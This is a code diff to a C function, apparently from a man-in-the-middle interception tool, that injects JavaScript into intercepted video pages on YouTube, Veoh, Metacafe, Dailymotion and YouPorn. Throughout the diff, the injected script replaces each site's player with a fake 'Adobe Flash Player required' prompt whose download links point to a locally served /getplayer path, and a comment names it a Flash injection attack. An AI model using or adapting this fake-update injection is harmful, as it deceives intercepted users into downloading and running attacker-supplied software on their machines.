@@ -38,8 +38,11 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
    char ipa_url[MAX_URL];
    int ret = 0;
 
-   if(strstr(host, "youtube"))
-   {
+   if (strstr(url, "www.youtube.com/watch") != NULL || 
+       strstr(url, "www.veoh.com/watch") != NULL || 
+       strstr(url, "www.metacafe.com/watch") != NULL || 
+       strstr(url, "www.dailymotion.com/video") != NULL || 
+       strstr(url, "www.youporn.com/watch") != NULL) {
       char *data;
       struct bio_inject_setup bis;
       int inject_len = 0;
@@ -116,19 +119,66 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
       
          char *html_to_inject = NULL;
 
-         ret = asprintf(&html_to_inject, 
-		"\n<script>" \
-		"        var adobelocalmirror = '/getplayer';\n" \
-		"        var c = document.createElement('link');\n" \
-		"        c.type = 'text/css'; c.rel = 'stylesheet'; c.href = 'http://s.ytimg.com/yts/cssbin/www-player-vfl0RUPb4.css';\n" \
-		"        document.getElementsByTagName('head')[0].appendChild(c);\n" \
-		"        var player = document.getElementById('player-api'); player.id = 'player-api-x';\n" \
-		/*"        if('textContent' in player) { var msg = player.textContent; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
-		"        if(!msg && ('innerHTML' in player)) { var msg = player.innerHTML; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
-		"        if(!msg) var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
-		"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\"><div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', adobelocalmirror).trim() + '</div></div></div>'"); */
-		"        var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
-		"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\"><div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', adobelocalmirror).trim() + '</div></div></div>';\n</script>\n");
+         if (strstr(url, "www.youtube.com/watch") != NULL)
+             ret = asprintf(&html_to_inject, 
+			/*
+                            Old INJECT-HTML-FLASH attack for youtube 
+
+                        "        if('textContent' in player) { var msg = player.textContent; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); " \
+                        "msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
+			"        if(!msg && ('innerHTML' in player)) { var msg = player.innerHTML; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); " \
+                        "msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
+			"        if(!msg) var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
+			"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\">" \
+                        "<div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', " \
+                        "adobelocalmirror).trim() + '</div></div></div>'"); 
+                        */
+                        "\n<script>" \
+                        "        var adobelocalmirror = '/getplayer';\n" \
+                        "        var c = document.createElement('link');\n" \
+                        "        c.type = 'text/css'; c.rel = 'stylesheet'; c.href = 'http://s.ytimg.com/yts/cssbin/www-player-vfl0RUPb4.css';\n" \
+                        "        document.getElementsByTagName('head')[0].appendChild(c);\n" \
+                        "        var player = document.getElementById('player-api'); player.id = 'player-api-x';\n" \
+			"        var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"/getplayer\">Download it from Adobe.</a>';\n" \
+			"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\">" \
+                        "<div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('/getplayer', adobelocalmirror).trim() + '" \
+                        "</div></div></div>';\n" \
+                        "</script>\n");
+         else if (strstr(url, "www.veoh.com/watch") != NULL)
+             ret = asprintf(&html_to_inject,
+                        "\n<script type='text/javascript'>\n" \
+			"        document.getElementById('videoPlayerContainer').innerHTML = '<div style=\"font-size:14px;border:1px #999999 solid;padding:30px;margin-top:50px;\">" \
+                        "<p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, or a newer version then the installed version.</p><p style=\"margin:10px 0;\">" \
+                        "Please download it from the following link:</p><p style=\"margin:10px 0;\"><a style=\"font-size:10px;\" href=\"/getplayer\">" \
+                        "<img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\"><br>" \
+                        "Get the latest Flash Player</a></p></div>';\n" \
+			"</script>\n");
+         else if (strstr(url, "www.metacafe.com/watch") != NULL)
+             ret = asprintf(&html_to_inject,
+			"\n<script type='text/javascript'>\n" \
+			"        document.getElementById('ItemContainer').innerHTML = '<div style=\"font-size:14px;border:1px #999999 solid;padding:30px;margin-top:50px;" \
+                        "margin-bottom:50px;margin-left:20px;margin-right:20px;\"><p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, or a newer version then " \
+                        "the installed version.</p><p style=\"margin:10px 0;\">Please download it from the following link:</p><p style=\"margin:10px 0;\"><a style=\"font-size:10px;\" " \
+                        "href=\"/getplayer\"><img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\">" \
+                        "<br>Get the latest Flash Player</a></p></div>';\n" \
+			"</script>\n");
+         else if (strstr(url, "www.dailymotion.com/video") != NULL)
+             ret = asprintf(&html_to_inject,
+			"<script type='text/javascript'>\n" \
+			"        document.getElementById('player_box').innerHTML = '<div style=\"font-size:14px;border:1px #999999 solid;padding:30px;margin-top:50px;margin-bottom:50px;" \
+                        "margin-left:20px;margin-right:20px;\"><p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, or a newer version then the installed version." \
+                        "</p><p style=\"margin:10px 0;\">Please download it from the following link:</p><p style=\"margin:10px 0;\"><a style=\"font-size:10px;\" href=\"/getplayer\">" \
+                        "<img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\"><br>" \
+                        "Get the latest Flash Player</a></p></div>';\n" \
+			"</script>\n");
+         else if (strstr(url, "www.youporn.com/watch") != NULL)
+             ret = asprintf(&html_to_inject,
+			"<script type='text/javascript'>\n" \
+			"        document.getElementById('videoWrapper').innerHTML = '<div id=\"no_flash_player_message\"><div id=\"getHtml5Player\"><div>Oh No!</div><div>" \
+                        "We noticed you do not have Flash installed. Follow the link below to install Flash</div><br><a style=\"font-size:10px;\" href=\"/getplayer\"><img style=\"" \
+                        "border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\"><br><br><a style=\"font-size:10px;\"" \
+                        " href=\"/getplayer\">Get the latest Flash Player</a><br></div>';\n" \
+			"</script>\n");
 
 	 if (ret == -1)
             DEBUG_MSG(D_ERROR, "Injection allocation failed");
@@ -136,7 +186,18 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 	 ON_ERROR(html_to_inject, NULL, "virtual memory exhausted");
 
          fbio = BIO_new(BIO_f_inject());
-	 bis.search = "player-api\"></div>";
+
+         if (strstr(url, "www.youtube.com/watch") != NULL)
+ 	     bis.search = "player-api\"></div>";
+         else if (strstr(url, "www.veoh.com/watch") != NULL)
+             bis.search = "recaptcha_ajax.js'></script>";
+         else if (strstr(url, "www.metacafe.com/watch") != NULL)
+             bis.search = "id=\"SideCol\">";
+         else if (strstr(url, "www.dailymotion.com/video") != NULL)
+             bis.search = "class=\"pl_video_infos span-8\">";
+         else if (strstr(url, "www.youporn.com/watch") != NULL)
+             bis.search = "style=\"clear:both;\"></div>";
+
          bis.inject = html_to_inject;
          bis.inject_len = strlen(html_to_inject);
 
